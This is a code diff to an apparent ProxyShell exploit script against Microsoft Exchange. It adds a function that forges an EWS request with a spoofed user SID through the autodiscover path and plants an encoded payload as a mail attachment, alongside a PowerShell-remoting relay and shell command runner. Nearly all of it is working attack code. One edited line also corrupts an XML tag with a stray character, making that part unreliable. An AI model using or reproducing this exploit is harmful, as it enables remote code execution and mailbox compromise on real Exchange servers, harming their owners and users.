@@ -25,7 +25,7 @@ class ExchangePowershellHandler(BaseHTTPRequestHandler):
         post_data = re.sub('<wsa:To>(.*?)</wsa:To>',
                            '<wsa:To>http://127.0.0.1:80/powershell</wsa:To>', post_data)
         post_data = re.sub('<wsman:ResourceURI s:mustUnderstand="true">(.*?)</wsman:ResourceURI>',
-                           '<wsman:ResourceURI>http://schemas.microsoft.com/powershell/Microsoft.Exchange</wsman:ResourceURI>', post_data)
+                           '<wsman:ResourceUśI>http://schemas.microsoft.com/powershell/Microsoft.Exchange</wsman:ResourceURI>', post_data)
 
         headers = {
             'Content-Type': content_type
@@ -136,10 +136,66 @@ def get_sid(url: str, email: str):
     print("[+] Successfully get User SID")
     return sid
 
-def send_email_contains_malicious_payload():
-    pass
 
-#------------------------------------------------------------------------------
+def send_email_contains_malicious_payload():
+    try:
+        print ("[-] Reading payload from encodePayload.txt file")
+        payload = open("encode-payload/encodedPayload.txt", "r").read()
+    except Exception as e:
+        print (str(e))
+        print ("[x] Run ps1 script to generate file and make sure the directory path is correct")
+        sys.exit(1)
+        
+    email_body = f"""
+    <soap:Envelope
+  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+  xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
+  xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
+  xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Header>
+    <t:RequestServerVersion Version="Exchange2016" />
+    <t:SerializedSecurityContext>
+      <t:UserSid>{sid}</t:UserSid>
+      <t:GroupSids>
+        <t:GroupIdentifier>
+          <t:SecurityIdentifier>S-1-5-21</t:SecurityIdentifier>
+        </t:GroupIdentifier>
+      </t:GroupSids>
+    </t:SerializedSecurityContext>
+  </soap:Header>
+  <soap:Body>
+    <m:CreateItem MessageDisposition="SaveOnly">
+      <m:Items>
+        <t:Message>
+          <t:Subject>Microsoft Exchange Server</t:Subject>
+          <t:Body BodyType="HTML">hello, if you see this, you are hacked</t:Body>
+          <t:Attachments>
+            <t:FileAttachment>
+              <t:Name>FileAttachment.txt</t:Name>
+              <t:IsInline>false</t:IsInline>
+              <t:IsContactPhoto>false</t:IsContactPhoto>
+              <t:Content>{payload}</t:Content>
+            </t:FileAttachment>
+          </t:Attachments>
+          <t:ToRecipients>
+            <t:Mailbox>
+              <t:EmailAddress>{email}</t:EmailAddress>
+            </t:Mailbox>
+          </t:ToRecipients>
+        </t:Message>
+      </m:Items>
+    </m:CreateItem>
+  </soap:Body>
+</soap:Envelope>
+    """
+    headers = {
+        "Content-Type": "text/xml"
+    }
+    ews_endpoint = exchange_url + f"/autodiscover/autodiscover.json?@test.com/ews/exchange.asmx?&Email=autodiscover/autodiscover.json%3F@test.com"
+    resp = requests.post(ews_endpoint, data=email_body.encode('utf-8'), headers=headers, verify=False)
+# ------------------------------------------------------------------------------
+
+
 def start_server(url: str, token: str, port: int):
     server = ThreadedHTTPServer(('', port), ExchangePowershellHandler)
     server_thread = threading.Thread(target=server.serve_forever)
@@ -162,7 +218,8 @@ def shell(command, port):
     print("OUTPUT:\n%s" % "\n".join([str(s) for s in output]))
     print("ERROR:\n%s" % "\n".join([str(s) for s in ps.streams.error]))
 
-#------------------------------------------------------------------------------
+# ------------------------------------------------------------------------------
+
 
 def main():
     parser = argparse.ArgumentParser(description='ProxyShell example')
@@ -172,6 +229,8 @@ def main():
     args = parser.parse_args()
     global exchange_url
     global token
+    global sid
+    global email
     exchange_url = args.u
     email = args.e
     local_port = args.p
